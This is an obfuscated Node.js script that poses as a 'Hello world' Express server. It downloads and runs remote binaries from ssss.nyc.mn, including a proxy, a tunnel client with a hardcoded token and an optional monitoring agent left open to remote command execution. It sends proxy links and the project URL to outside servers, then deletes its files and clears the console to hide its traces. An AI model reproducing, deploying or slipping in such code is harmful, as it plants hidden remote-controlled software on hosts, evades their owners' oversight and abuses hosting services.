const _0x445a55=_0xf517;(function(_0x3b2d7c,_0xf1acb3){const _0x4317d4=_0xf517,_0x5e3eb3=_0x3b2d7c();while(!![]){try{const _0x4f7ca4=parseInt(_0x4317d4(0x179))/0x1+parseInt(_0x4317d4(0x1d6))/0x2*(-parseInt(_0x4317d4(0x19d))/0x3)+-parseInt(_0x4317d4(0x1d2))/0x4*(parseInt(_0x4317d4(0x15f))/0x5)+parseInt(_0x4317d4(0x1c9))/0x6+-parseInt(_0x4317d4(0x14d))/0x7+parseInt(_0x4317d4(0x1da))/0x8+parseInt(_0x4317d4(0x198))/0x9*(parseInt(_0x4317d4(0x1c1))/0xa);if(_0x4f7ca4===_0xf1acb3)break;else _0x5e3eb3['push'](_0x5e3eb3['shift']());}catch(_0xa8b94c){_0x5e3eb3['push'](_0x5e3eb3['shift']());}}}(_0xdf5b,0xa1b3b));function _0xdf5b(){const _0x368b34=['./npm','Error\x20reading\x20boot.log:','list.txt','https://oooo.serv00.net/add-url','www.visa.com.sg','tunnel.yml','1572USYueR','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','php\x20running\x20error:\x20','finish','422224rzZdHp','post','trojan','response','6584920Fvpsuy','https://amd64.ssss.nyc.mn/v1','none','stringify','FILE_PATH','log','Content-Type','from','sub','utf-8','false','./tmp','status','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','./web','readFileSync','forEach','ARGO_DOMAIN:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2083','message','tunnel.json','test','true','fileUrl','arm','2096','https://arm64.ssss.nyc.mn/agent','length','/api/add-subscriptions','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','freedom','8443','443','createWriteStream','\x20-p\x20','xtls-rprx-vision','6475035vdbxzt','/vmess-argo','/api/delete-nodes','tcp','bot','push','pipe','vmess','filter','config.json','&path=%2Fvless-argo%3Fed%3D2560#','web\x20running\x20error:\x20','aarch64','existsSync','/npm\x20-s\x20','NEZHA_KEY','unlink','https://amd64.ssss.nyc.mn/2go','15410TeFhbI','Empowerment\x20failed\x20for\x20','automatic\x20access\x20task\x20added\x20successfully','vless','NEZHA\x20variable\x20is\x20empty,skip\x20running','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','&path=%2Ftrojan-argo%3Fed%3D2560#','npm\x20running\x20error:\x20','catch','&type=ws&host=','App\x20is\x20running','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','Error\x20downloading\x20files:','match','SERVER_PORT','127.0.0.1','arm64','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Empowerment\x20success\x20for\x20','split','/bot\x20','child_process','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','389782CBKlwq','NEZHA_SERVER','Skipping\x20adding\x20automatic\x20access\x20task','\x0aclient_secret:\x20','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20\x20\x20','tls','error','unlinkSync','arch','\x20>/dev/null\x202>&1\x20&','trim','UUID','Download\x20','https://amd64.ssss.nyc.mn/agent','ARGO_PORT','php','web','/php\x20-c\x20\x22','/trojan-argo','https://amd64.ssss.nyc.mn/web','set','NEZHA_PORT','\x0a\x20\x20\x0atrojan://','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Subscription\x20uploaded\x20successfully','\x0a\x20\x20\x0avmess://','./php','/vless-argo','has','Vls','824310SJfOyM','sub.txt','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','clear','application/json','9BrJYTu','/config.json\x20>/dev/null\x202>&1\x20&','mkdirSync','quic','nohup\x20','writeFileSync','2053','data','\x20failed:\x20','UPLOAD_URL','bot\x20is\x20running','TunnelSecret','join','pop','galaxy.goomedfdl.cf','ARGO_AUTH','direct','includes','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20credentials-file:\x20','amd','http','PROJECT_URL','/api/add-nodes','eyJhIjoiMmUxN2FjZjY0ZTVkMTJiOTFjN2FkMTBmOWZlNjdlMTAiLCJ0IjoiZWZjMzczYzAtNjE1NS00OWFjLWE1ZTktMjc4YzZjZjhjZGRmIiwicyI6IlpEYzRPVFl3WkRndFl6azFNeTAwTUdGa0xXSTVaR0l0T0RKa1pqQTVPVGhrTkRrMSJ9','Error\x20executing\x20command:\x20','boot.log','chmod','添加URL失败:\x20','base64','block','npm','\x20>/dev/null\x202>&1','close','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','210YHlUxQ','env','\x20is\x20created','/tunnel.yml\x20run','get','then','toString','PORT','1773666GoKMCN','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','?encryption=none&security=tls&sni='];_0xdf5b=function(){return _0x368b34;};return _0xdf5b();}const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x445a55(0x176))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x445a55(0x1c2)][_0x445a55(0x1a6)]||'',PROJECT_URL=process['env'][_0x445a55(0x1b3)]||'',AUTO_ACCESS=process[_0x445a55(0x1c2)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x445a55(0x1c2)][_0x445a55(0x12c)]||_0x445a55(0x133),SUB_PATH=process[_0x445a55(0x1c2)]['SUB_PATH']||_0x445a55(0x130),PORT=process['env'][_0x445a55(0x16f)]||process[_0x445a55(0x1c2)][_0x445a55(0x1c8)]||0xbb8,UUID=process[_0x445a55(0x1c2)][_0x445a55(0x185)]||'5988e2a1-d8b5-4a0b-8845-04148a9d5030',NEZHA_SERVER=process[_0x445a55(0x1c2)][_0x445a55(0x17a)]||'',NEZHA_PORT=process['env'][_0x445a55(0x18f)]||'',NEZHA_KEY=process[_0x445a55(0x1c2)][_0x445a55(0x15c)]||'',ARGO_DOMAIN=process[_0x445a55(0x1c2)]['ARGO_DOMAIN']||_0x445a55(0x1ab),ARGO_AUTH=process[_0x445a55(0x1c2)][_0x445a55(0x1ac)]||_0x445a55(0x1b5),ARGO_PORT=process[_0x445a55(0x1c2)][_0x445a55(0x188)]||0x1f41,CFIP=process[_0x445a55(0x1c2)][_0x445a55(0x177)]||_0x445a55(0x1d0),CFPORT=process[_0x445a55(0x1c2)]['CFPORT']||0x1bb,NAME=process[_0x445a55(0x1c2)]['NAME']||_0x445a55(0x197);!fs[_0x445a55(0x15a)](FILE_PATH)?(fs[_0x445a55(0x19f)](FILE_PATH),console[_0x445a55(0x12d)](FILE_PATH+_0x445a55(0x1c3))):console['log'](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x445a55(0x1a9)](FILE_PATH,_0x445a55(0x1bc)),phpPath=path['join'](FILE_PATH,_0x445a55(0x189)),webPath=path['join'](FILE_PATH,_0x445a55(0x18a)),botPath=path[_0x445a55(0x1a9)](FILE_PATH,_0x445a55(0x151)),subPath=path[_0x445a55(0x1a9)](FILE_PATH,_0x445a55(0x199)),listPath=path['join'](FILE_PATH,_0x445a55(0x1ce)),bootLogPath=path[_0x445a55(0x1a9)](FILE_PATH,_0x445a55(0x1b7)),configPath=path[_0x445a55(0x1a9)](FILE_PATH,_0x445a55(0x156));function deleteNodes(){const _0x2825cc=_0x445a55;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xd4d4f5;try{_0xd4d4f5=fs[_0x2825cc(0x137)](subPath,_0x2825cc(0x131));}catch{return null;}const _0xcdbbab=Buffer[_0x2825cc(0x12f)](_0xd4d4f5,_0x2825cc(0x1ba))['toString'](_0x2825cc(0x131)),_0x31387d=_0xcdbbab[_0x2825cc(0x174)]('\x0a')[_0x2825cc(0x155)](_0x22644d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2825cc(0x13e)](_0x22644d));if(_0x31387d['length']===0x0)return;return axios[_0x2825cc(0x1d7)](UPLOAD_URL+_0x2825cc(0x14f),JSON[_0x2825cc(0x1dd)]({'nodes':_0x31387d}),{'headers':{'Content-Type':_0x2825cc(0x19c)}})[_0x2825cc(0x169)](_0x436725=>{return null;});}catch(_0x4f8eda){return null;}}function cleanupOldFiles(){const _0x3940c0=_0x445a55,_0x5c7606=[_0x3940c0(0x18a),_0x3940c0(0x151),'npm',_0x3940c0(0x189),'sub.txt',_0x3940c0(0x1b7)];_0x5c7606[_0x3940c0(0x138)](_0x573192=>{const _0x393e32=_0x3940c0,_0x3cb9cd=path[_0x393e32(0x1a9)](FILE_PATH,_0x573192);fs[_0x393e32(0x15d)](_0x3cb9cd,()=>{});});}app[_0x445a55(0x1c5)]('/',function(_0x3782a5,_0xefa39b){_0xefa39b['send']('Hello\x20world!');});const config={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x445a55(0x1dc)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x445a55(0x162),'settings':{'clients':[{'id':UUID,'flow':_0x445a55(0x14c)}],'decryption':_0x445a55(0x1dc),'fallbacks':[{'dest':0xbb9},{'path':_0x445a55(0x195),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x445a55(0x18c),'dest':0xbbc}]},'streamSettings':{'network':_0x445a55(0x150)}},{'port':0xbb9,'listen':_0x445a55(0x170),'protocol':_0x445a55(0x162),'settings':{'clients':[{'id':UUID}],'decryption':_0x445a55(0x1dc)},'streamSettings':{'network':_0x445a55(0x150),'security':'none'}},{'port':0xbba,'listen':_0x445a55(0x170),'protocol':_0x445a55(0x162),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x445a55(0x1dc)},'streamSettings':{'network':'ws','security':_0x445a55(0x1dc),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':![],'destOverride':[_0x445a55(0x1b2),_0x445a55(0x17f),_0x445a55(0x1a0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x445a55(0x170),'protocol':_0x445a55(0x154),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x445a55(0x14e)}},'sniffing':{'enabled':![],'destOverride':['http',_0x445a55(0x17f),_0x445a55(0x1a0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x445a55(0x170),'protocol':_0x445a55(0x1d8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x445a55(0x18c)}},'sniffing':{'enabled':![],'destOverride':[_0x445a55(0x1b2),'tls',_0x445a55(0x1a0)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x445a55(0x147),'tag':_0x445a55(0x1ad)},{'protocol':'blackhole','tag':_0x445a55(0x1bb)}]};fs[_0x445a55(0x1a2)](path['join'](FILE_PATH,_0x445a55(0x156)),JSON[_0x445a55(0x1dd)](config,null,0x2));function getSystemArchitecture(){const _0x5176d0=_0x445a55,_0x17da8c=os[_0x5176d0(0x182)]();return _0x17da8c===_0x5176d0(0x141)||_0x17da8c===_0x5176d0(0x171)||_0x17da8c===_0x5176d0(0x159)?_0x5176d0(0x141):_0x5176d0(0x1b1);}function downloadFile(_0x1c2f1f,_0x50a591,_0x2c1d0a){const _0x292755=_0x445a55,_0x4bf005=path['join'](FILE_PATH,_0x1c2f1f),_0x4f6965=fs[_0x292755(0x14a)](_0x4bf005);axios({'method':_0x292755(0x1c5),'url':_0x50a591,'responseType':'stream'})[_0x292755(0x1c6)](_0x4c5fc7=>{const _0x427143=_0x292755;_0x4c5fc7[_0x427143(0x1a4)][_0x427143(0x153)](_0x4f6965),_0x4f6965['on'](_0x427143(0x1d5),()=>{const _0x4da78d=_0x427143;_0x4f6965[_0x4da78d(0x1be)](),console[_0x4da78d(0x12d)]('Download\x20'+_0x1c2f1f+'\x20successfully'),_0x2c1d0a(null,_0x1c2f1f);}),_0x4f6965['on'](_0x427143(0x180),_0x27c62c=>{const _0x208493=_0x427143;fs[_0x208493(0x15d)](_0x4bf005,()=>{});const _0x45ff72=_0x208493(0x186)+_0x1c2f1f+_0x208493(0x1a5)+_0x27c62c['message'];console[_0x208493(0x180)](_0x45ff72),_0x2c1d0a(_0x45ff72);});})['catch'](_0x376232=>{const _0x269c19=_0x292755,_0x2e6ccb=_0x269c19(0x186)+_0x1c2f1f+_0x269c19(0x1a5)+_0x376232[_0x269c19(0x13c)];console[_0x269c19(0x180)](_0x2e6ccb),_0x2c1d0a(_0x2e6ccb);});}async function downloadFilesAndRun(){const _0x5a7443=_0x445a55,_0x59ef2c=getSystemArchitecture(),_0x1f9aa0=getFilesForArchitecture(_0x59ef2c);if(_0x1f9aa0[_0x5a7443(0x144)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x30285a=_0x1f9aa0['map'](_0x154336=>{return new Promise((_0x2e6d3c,_0x2b6d31)=>{const _0x389d74=_0xf517;downloadFile(_0x154336['fileName'],_0x154336[_0x389d74(0x140)],(_0x5b964d,_0xf3cbb4)=>{_0x5b964d?_0x2b6d31(_0x5b964d):_0x2e6d3c(_0xf3cbb4);});});});try{await Promise['all'](_0x30285a);}catch(_0x1b4d31){console[_0x5a7443(0x180)](_0x5a7443(0x16d),_0x1b4d31);return;}function _0x1bdda0(_0x3d6cce){const _0x46a764=_0x5a7443,_0x1edc31=0x1fd;_0x3d6cce[_0x46a764(0x138)](_0x249516=>{const _0x2a885b=_0x46a764,_0x51c970=path['join'](FILE_PATH,_0x249516);fs[_0x2a885b(0x15a)](_0x51c970)&&fs[_0x2a885b(0x1b8)](_0x51c970,_0x1edc31,_0x36ee31=>{const _0x41ba8e=_0x2a885b;_0x36ee31?console[_0x41ba8e(0x180)](_0x41ba8e(0x160)+_0x51c970+':\x20'+_0x36ee31):console[_0x41ba8e(0x12d)](_0x41ba8e(0x173)+_0x51c970+':\x20'+_0x1edc31[_0x41ba8e(0x1c7)](0x8));});});}const _0x1863e9=NEZHA_PORT?[_0x5a7443(0x1cc),_0x5a7443(0x136),'./bot']:[_0x5a7443(0x194),'./web','./bot'];_0x1bdda0(_0x1863e9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x19b764=NEZHA_SERVER[_0x5a7443(0x1ae)](':')?NEZHA_SERVER[_0x5a7443(0x174)](':')[_0x5a7443(0x1aa)]():'',_0x12910c=new Set([_0x5a7443(0x149),_0x5a7443(0x148),'2096',_0x5a7443(0x164),_0x5a7443(0x13b),_0x5a7443(0x1a3)]),_0x347d1d=_0x12910c[_0x5a7443(0x196)](_0x19b764)?_0x5a7443(0x13f):_0x5a7443(0x132),_0x5a5083=_0x5a7443(0x17c)+NEZHA_KEY+_0x5a7443(0x16c)+NEZHA_SERVER+_0x5a7443(0x146)+_0x347d1d+_0x5a7443(0x135)+UUID;fs[_0x5a7443(0x1a2)](path['join'](FILE_PATH,'config.yaml'),_0x5a5083);const _0x19ce60=_0x5a7443(0x1a1)+FILE_PATH+_0x5a7443(0x18b)+FILE_PATH+_0x5a7443(0x1c0);try{await exec(_0x19ce60),console['log']('php\x20is\x20running'),await new Promise(_0x521263=>setTimeout(_0x521263,0x3e8));}catch(_0x25fef3){console[_0x5a7443(0x180)](_0x5a7443(0x1d4)+_0x25fef3);}}else{let _0x6c2a4f='';const _0x2c041f=[_0x5a7443(0x149),_0x5a7443(0x148),_0x5a7443(0x142),_0x5a7443(0x164),_0x5a7443(0x13b),'2053'];_0x2c041f['includes'](NEZHA_PORT)&&(_0x6c2a4f='--tls');const _0x199b36='nohup\x20'+FILE_PATH+_0x5a7443(0x15b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5a7443(0x14b)+NEZHA_KEY+'\x20'+_0x6c2a4f+_0x5a7443(0x183);try{await exec(_0x199b36),console['log']('npm\x20is\x20running'),await new Promise(_0x54005c=>setTimeout(_0x54005c,0x3e8));}catch(_0x480fc1){console[_0x5a7443(0x180)](_0x5a7443(0x168)+_0x480fc1);}}}else console['log'](_0x5a7443(0x163));const _0xd00fea='nohup\x20'+FILE_PATH+'/web\x20-c\x20'+FILE_PATH+_0x5a7443(0x19e);try{await exec(_0xd00fea),console[_0x5a7443(0x12d)]('web\x20is\x20running'),await new Promise(_0xf7bb15=>setTimeout(_0xf7bb15,0x3e8));}catch(_0x561e0f){console[_0x5a7443(0x180)](_0x5a7443(0x158)+_0x561e0f);}if(fs[_0x5a7443(0x15a)](path[_0x5a7443(0x1a9)](FILE_PATH,_0x5a7443(0x151)))){let _0x2da90a;if(ARGO_AUTH[_0x5a7443(0x16e)](/^[A-Z0-9a-z=]{120,250}$/))_0x2da90a=_0x5a7443(0x178)+ARGO_AUTH;else ARGO_AUTH[_0x5a7443(0x16e)](/TunnelSecret/)?_0x2da90a='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5a7443(0x1c4):_0x2da90a=_0x5a7443(0x1ca)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5a7443(0x1a1)+FILE_PATH+_0x5a7443(0x175)+_0x2da90a+_0x5a7443(0x183)),console[_0x5a7443(0x12d)](_0x5a7443(0x1a7)),await new Promise(_0x47d2b6=>setTimeout(_0x47d2b6,0x7d0));}catch(_0x4cc09f){console['error'](_0x5a7443(0x1b6)+_0x4cc09f);}}await new Promise(_0x28f40c=>setTimeout(_0x28f40c,0x1388));}function getFilesForArchitecture(_0x199aaf){const _0x507a08=_0x445a55;let _0x5ba30b;_0x199aaf===_0x507a08(0x141)?_0x5ba30b=[{'fileName':_0x507a08(0x18a),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x507a08(0x151),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x5ba30b=[{'fileName':_0x507a08(0x18a),'fileUrl':_0x507a08(0x18d)},{'fileName':_0x507a08(0x151),'fileUrl':_0x507a08(0x15e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3f5300=_0x199aaf===_0x507a08(0x141)?_0x507a08(0x143):_0x507a08(0x187);_0x5ba30b['unshift']({'fileName':_0x507a08(0x1bc),'fileUrl':_0x3f5300});}else{const _0x14dfc8=_0x199aaf===_0x507a08(0x141)?_0x507a08(0x17d):_0x507a08(0x1db);_0x5ba30b[_0x507a08(0x1bf)]({'fileName':_0x507a08(0x189),'fileUrl':_0x14dfc8});}}return _0x5ba30b;}function argoType(){const _0x5ebb39=_0x445a55;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x5ebb39(0x165));return;}if(ARGO_AUTH[_0x5ebb39(0x1ae)](_0x5ebb39(0x1a8))){fs[_0x5ebb39(0x1a2)](path[_0x5ebb39(0x1a9)](FILE_PATH,_0x5ebb39(0x13d)),ARGO_AUTH);const _0x13f30d='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x5ebb39(0x174)]('\x22')[0xb]+_0x5ebb39(0x1b0)+path['join'](FILE_PATH,_0x5ebb39(0x13d))+_0x5ebb39(0x191)+ARGO_DOMAIN+_0x5ebb39(0x1af)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x5ebb39(0x1a2)](path[_0x5ebb39(0x1a9)](FILE_PATH,_0x5ebb39(0x1d1)),_0x13f30d);}else console['log'](_0x5ebb39(0x172));}argoType();async function extractDomains(){const _0x393e2e=_0x445a55;let _0x3eecb2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3eecb2=ARGO_DOMAIN,console[_0x393e2e(0x12d)](_0x393e2e(0x139),_0x3eecb2),await _0x2f9f6(_0x3eecb2);else try{const _0x4a8e2e=fs[_0x393e2e(0x137)](path[_0x393e2e(0x1a9)](FILE_PATH,_0x393e2e(0x1b7)),_0x393e2e(0x131)),_0x299c2a=_0x4a8e2e[_0x393e2e(0x174)]('\x0a'),_0x177c1e=[];_0x299c2a['forEach'](_0xeb922f=>{const _0x15b9ec=_0x393e2e,_0x1438b3=_0xeb922f[_0x15b9ec(0x16e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1438b3){const _0x7a38a6=_0x1438b3[0x1];_0x177c1e[_0x15b9ec(0x152)](_0x7a38a6);}});if(_0x177c1e[_0x393e2e(0x144)]>0x0)_0x3eecb2=_0x177c1e[0x0],console[_0x393e2e(0x12d)]('ArgoDomain:',_0x3eecb2),await _0x2f9f6(_0x3eecb2);else{console['log'](_0x393e2e(0x166)),fs[_0x393e2e(0x181)](path['join'](FILE_PATH,_0x393e2e(0x1b7)));async function _0x13c892(){const _0x417e82=_0x393e2e;try{await exec(_0x417e82(0x1d3));}catch(_0x2e986d){}}_0x13c892(),await new Promise(_0x366f60=>setTimeout(_0x366f60,0xbb8));const _0x1f9a33=_0x393e2e(0x1ca)+FILE_PATH+_0x393e2e(0x19a)+ARGO_PORT;try{await exec(_0x393e2e(0x1a1)+path[_0x393e2e(0x1a9)](FILE_PATH,_0x393e2e(0x151))+'\x20'+_0x1f9a33+_0x393e2e(0x183)),console[_0x393e2e(0x12d)]('bot\x20is\x20running.'),await new Promise(_0x290945=>setTimeout(_0x290945,0xbb8)),await extractDomains();}catch(_0x36ec48){console[_0x393e2e(0x180)](_0x393e2e(0x1b6)+_0x36ec48);}}}catch(_0x10ad01){console[_0x393e2e(0x180)](_0x393e2e(0x1cd),_0x10ad01);}async function _0x2f9f6(_0x5ec51c){const _0x37ac91=_0x393e2e,_0x2d147d=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x37ac91(0x131)}),_0x32ccad=_0x2d147d[_0x37ac91(0x184)]();return new Promise(_0x2ddbde=>{setTimeout(()=>{const _0x4920c5=_0xf517,_0x42fb3e={'v':'2','ps':NAME+'-'+_0x32ccad,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4920c5(0x1dc),'net':'ws','type':_0x4920c5(0x1dc),'host':_0x5ec51c,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x5ec51c,'alpn':''},_0x1ee3f1='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4920c5(0x1cb)+_0x5ec51c+_0x4920c5(0x16a)+_0x5ec51c+_0x4920c5(0x157)+NAME+'-'+_0x32ccad+_0x4920c5(0x193)+Buffer['from'](JSON[_0x4920c5(0x1dd)](_0x42fb3e))['toString']('base64')+_0x4920c5(0x190)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5ec51c+'&type=ws&host='+_0x5ec51c+_0x4920c5(0x167)+NAME+'-'+_0x32ccad+_0x4920c5(0x17e);console[_0x4920c5(0x12d)](Buffer[_0x4920c5(0x12f)](_0x1ee3f1)['toString']('base64')),fs[_0x4920c5(0x1a2)](subPath,Buffer[_0x4920c5(0x12f)](_0x1ee3f1)[_0x4920c5(0x1c7)]('base64')),console[_0x4920c5(0x12d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app['get']('/'+SUB_PATH,(_0xdcd580,_0x559d4d)=>{const _0xc7f46b=_0x4920c5,_0x2ed9eb=Buffer[_0xc7f46b(0x12f)](_0x1ee3f1)[_0xc7f46b(0x1c7)](_0xc7f46b(0x1ba));_0x559d4d[_0xc7f46b(0x18e)](_0xc7f46b(0x12e),'text/plain;\x20charset=utf-8'),_0x559d4d['send'](_0x2ed9eb);}),_0x2ddbde(_0x1ee3f1);},0x7d0);});}}async function uplodNodes(){const _0x5b305f=_0x445a55;if(UPLOAD_URL&&PROJECT_URL){const _0xf2744a=PROJECT_URL+'/'+SUB_PATH,_0x37b7a0={'subscription':[_0xf2744a]};try{const _0x1692d0=await axios[_0x5b305f(0x1d7)](UPLOAD_URL+_0x5b305f(0x145),_0x37b7a0,{'headers':{'Content-Type':'application/json'}});if(_0x1692d0[_0x5b305f(0x134)]===0xc8)console[_0x5b305f(0x12d)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x359fac){if(_0x359fac[_0x5b305f(0x1d9)]){if(_0x359fac[_0x5b305f(0x1d9)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5b305f(0x15a)](listPath))return;const _0x337f94=fs[_0x5b305f(0x137)](listPath,_0x5b305f(0x131)),_0x18ab44=_0x337f94[_0x5b305f(0x174)]('\x0a')[_0x5b305f(0x155)](_0xb7f67e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5b305f(0x13e)](_0xb7f67e));if(_0x18ab44[_0x5b305f(0x144)]===0x0)return;const _0x2fcea8=JSON[_0x5b305f(0x1dd)]({'nodes':_0x18ab44});try{await axios['post'](UPLOAD_URL+_0x5b305f(0x1b4),_0x2fcea8,{'headers':{'Content-Type':'application/json'}});if(response[_0x5b305f(0x134)]===0xc8)console[_0x5b305f(0x12d)](_0x5b305f(0x192));else return null;}catch(_0x379c16){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x501d12=_0xf517,_0x3c428d=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x3c428d['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3c428d[_0x501d12(0x152)](phpPath);exec('rm\x20-rf\x20'+_0x3c428d[_0x501d12(0x1a9)]('\x20')+_0x501d12(0x1bd),_0x3912ac=>{const _0x210c6a=_0x501d12;console[_0x210c6a(0x19b)](),console[_0x210c6a(0x12d)](_0x210c6a(0x16b)),console['log'](_0x210c6a(0x13a));});},0x15f90);}cleanFiles();function _0xf517(_0x407927,_0x207cfb){const _0xdf5bce=_0xdf5b();return _0xf517=function(_0xf517d6,_0x4a3c23){_0xf517d6=_0xf517d6-0x12c;let _0x3966f3=_0xdf5bce[_0xf517d6];return _0x3966f3;},_0xf517(_0x407927,_0x207cfb);}async function AddVisitTask(){const _0xd82a51=_0x445a55;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xd82a51(0x12d)](_0xd82a51(0x17b));return;}try{const _0x153681=await axios[_0xd82a51(0x1d7)](_0xd82a51(0x1cf),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xd82a51(0x19c)}});console['log'](_0xd82a51(0x161));}catch(_0x5b9893){console['error'](_0xd82a51(0x1b9)+_0x5b9893[_0xd82a51(0x13c)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console[_0x445a55(0x12d)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
